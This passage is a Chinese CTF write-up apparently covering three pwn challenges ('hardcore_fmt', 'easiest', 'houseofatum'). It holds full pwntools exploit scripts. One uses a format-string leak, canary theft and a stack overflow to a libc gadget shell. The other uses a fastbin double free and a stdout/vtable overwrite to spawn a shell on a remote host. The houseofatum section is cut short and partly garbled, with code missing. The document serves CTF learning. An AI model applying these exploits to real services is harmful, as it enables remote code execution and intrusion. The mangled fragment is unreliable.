        0x555555755000     0x555555756000 r--p     1000 1000   /pwn/hardcore_fmt
        0x555555756000     0x555555757000 rw-p     1000 2000   /pwn/hardcore_fmt
        0x7ffff79e4000     0x7ffff7bcb000 r-xp   1e7000 0      /lib/x86_64-linux-gnu/libc-2.27.so
        0x7ffff7bcb000     0x7ffff7dcb000 ---p   200000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
        0x7ffff7dcb000     0x7ffff7dcf000 r--p     4000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
        0x7ffff7dcf000     0x7ffff7dd1000 rw-p     2000 1eb000 /lib/x86_64-linux-gnu/libc-2.27.so
        0x7ffff7dd1000     0x7ffff7dd5000 rw-p     4000 0      
        0x7ffff7dd5000     0x7ffff7dfc000 r-xp    27000 0      /lib/x86_64-linux-gnu/ld-2.27.so
        0x7ffff7fec000     0x7ffff7fee000 rw-p     2000 0      
        0x7ffff7ff7000     0x7ffff7ffa000 r--p     3000 0      [vvar]
        0x7ffff7ffa000     0x7ffff7ffc000 r-xp     2000 0      [vdso]
        0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000 27000  /lib/x86_64-linux-gnu/ld-2.27.so
        0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000 28000  /lib/x86_64-linux-gnu/ld-2.27.so
        0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000 0      
        0x7ffffffde000     0x7ffffffff000 rw-p    21000 0      [stack]
    0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]
所以这两个地址分别在ld前后，但是至少是出来地址了。这个时候发现有一个地址还位于libc之后，根据以前的经验，这个位置一般是TLS的，也就是canary的保存地址，那么思路就出来了，通过一个地址去拿到TLS的地址，再根据这个地址，得到canary的地址，然后通过后面的任意地址泄露去把canary泄露出来，最后的栈溢出才能派上用场。这个时候其实还需要libc的地址，但是libc基地址和TLS的基地址的offset根据以前的经验，是不太一样的（各个内核不一样，但是相同内核好像不变），反正不是有任意地址泄露么？通过任意地址泄露去爆破一下，直到出现ELF头（libc的elf头），这样就得到偏移量，最后事情就简单了。
    #! /usr/bin/env python2
    # -*- coding: utf-8 -*-    # vim:fenc=utf-8
    #
    # Copyright © 2018 anciety 
    #
    # Distributed under terms of the MIT license.
    import sys
    import os
    import os.path
    from pwn import *
    context(os='linux', arch='amd64', log_level='debug')
    context.terminal = ['lxterminal', '-e']
    # synonyms for faster typing
    tube.s = tube.send
    tube.sl = tube.sendline
    tube.sa = tube.sendafter
    tube.sla = tube.sendlineafter
    tube.r = tube.recv
    tube.ru = tube.recvuntil
    tube.rl = tube.recvline
    tube.rr = tube.recvregex
    tube.irt = tube.interactive
    if len(sys.argv) > 2:
        DEBUG = 0
        HOST = sys.argv[1]
        PORT = int(sys.argv[2])
        p = remote(HOST, PORT)
    else:
        DEBUG = 1
        if len(sys.argv) == 2:
            PATH = sys.argv[1]
        p = process(PATH)
    libc = ELF('./libc-2.27.so')
    def main():
        # Your exploit script goes here
        p.ru('fmt\n')
        p.sl('%a%a%a%a%a')
        p.ru('1p-10220x0.07')
        p.ru('1p-10220x0.0')
        tls_addr = int(p.ru('p-1')[:-3] + '00', 16)
        p.info('tls addr 0x%x' % tls_addr)
        p.sl(str(tls_addr + 0x29))
        p.ru(': ')
        canary = p.r(15)
        #gdb.attach(p)
        if DEBUG:
            libc_addr = tls_addr - 0x500 - 0x60e000
        else:
            libc_addr = tls_addr - 0x500 - 0x60e000 - 0x9000
        payload = 'a' * 0x100 + 'b' * 8 + '\x00' + canary
        payload += 'x' * 16
        payload += p64(libc_addr + 0x4f2c5)
        p.sl(payload)
        p.irt()
    def get_libc_offset(p, offset):
        p.ru('fmt\n')
        p.sl('%a%a%a%a%a')
        p.ru('1p-10220x0.07')
        p.ru('1p-10220x0.0')
        tls_addr = int(p.ru('p-1')[:-3] + '00', 16)
        p.info('tls addr 0x%x' % tls_addr)
        libc_addr = tls_addr - 0x500 - 0x60e000 + offset
        p.rl()
        #gdb.attach(p)
        p.sl(str(libc_addr))
        p.ru(': ')
        magic = p.r(4)
        p.info(magic)
        if magic == '\x7fELF':
            return True
        else:
            return False
    def brute_force():
        for i in range(-0x9000, -0x8000, 0x1000):
            with remote(sys.argv[1], sys.argv[2]) as p:
                try:
                    p.info('offset: %x' % i)
                    if get_libc_offset(p, i):
                        break
                except Exception as e:
                    p.info(e)
                    continue
    if __name__ == '__main__':
        main()
### easiest
bug还行，比较明显，delete没有清空，造成double free，没有edit所以不能直接UAF。
题目好像没有给libc，不过赌了一把libc是2.23（因为看题目名字好像是atum出的，他曾经暴露过他用的ubuntu 16.04
[奸笑]，好吧我承认，主要是因为别的我就不会做了，所以就试试呗）
然后就是找fastbin attack能打的地方，因为没办法leak libc，所以老方法（什么malloc hook，free hook就别想了）。
在已知地址范围内（bin里），能打的地方并不多，其中一个就是GOT表之后的data，里边有stdin和stdout的内容（这两个地址差0x10，也就是至少有一个0x8的空白，能够用来当fastbin
attack的目标，这也是为什么GOT不能直接打，因为不存在这样的条件，满足不了size），所以可以改stdin或者stdout的指针（stdin也可以改，因为前面got的地址可以用来当size，足够控制到stdin）。
最开始尝试改stdin，然后发现，因为是`fread`一个字节一个字节读的，在读的过程当中，stdin就已经变成无效地址了，所以不能改stdin，那就只剩stdout了，那就改stdout然后构造一下结构体即可。构造的过程稍微有一点tricky，需要跟到函数里面去看哪些地址被用到了（我记得有0x88,
0xd8和还有一个不记得的偏移有意义，需要分别满足指向为0之类的条件，0xd8是vtable偏移，就比较好办），最后就调vtable就好了。
    #! /usr/bin/env python2
    # -*- coding: utf-8 -*-    # vim:fenc=utf-8
    #
    # Copyright © 2018 anciety 
    #
    # Distributed under terms of the MIT license.
    import sys
    import os
    import os.path
    from pwn import *
    context(os='linux', arch='amd64', log_level='debug')
    context.terminal = ['lxterminal', '-e']
    # synonyms for faster typing
    tube.s = tube.send
    tube.sl = tube.sendline
    tube.sa = tube.sendafter
    tube.sla = tube.sendlineafter
    tube.r = tube.recv
    tube.ru = tube.recvuntil
    tube.rl = tube.recvline
    tube.rr = tube.recvregex
    tube.irt = tube.interactive
    if len(sys.argv) > 2:
        DEBUG = 0
        HOST = sys.argv[1]
        PORT = int(sys.argv[2])
        p = remote(HOST, PORT)
    else:
        DEBUG = 1
        if len(sys.argv) == 2:
            PATH = sys.argv[1]
        p = process(PATH)
    def add(idx, size, content):
        p.ru('delete \n')
        p.sl('1')
        p.ru('(0-11):')
        p.sl(str(idx))
        p.ru('Length:')
        p.sl(str(size))
        p.ru('C:')
        p.sl(content)
    def delete(idx):
        p.ru('delete \n')
        p.sl('2')
        p.ru('(0-11):')
        p.sl(str(idx))
    def main():
        # Your exploit script goes here
        add(10, 0x110, p64(0x400946) * (0x100 // 0x8))
        add(0, 0x31, 'a')
        add(1, 0x31, 'b')
        delete(0)
        delete(1)
        delete(0)
        add(0, 0x31, p64(0x602082 - 8))
        add(1, 0x31, 'neo is god')
        add(1, 0x31, p64(0))
        #gdb.attach(p, 'b vfprintf')
        add(11, 0x31, 'a' * 6 + '\x00' * 0x10 + p64(0x6020c0 - 0x88))
        p.sl('1')
        p.irt()
    if __name__ == '__main__':
        main()
### houseofatum
three 利用的进一步，这次只有两个chunk可以用。
    int alloc()
    {
      int i; // [rsp+Ch] [rbp-4h]
      for ( i = 0; i = 0 && v1  0x555555757010
  4. 然后再把 heap 头这个 chunk 拿回来 ，free 它7次，直到 tcahce 满了
  5. 这个时候 heap 头的这块chunk 就会被放入到 unsortbin: 0x555555757000 (size : 0x250)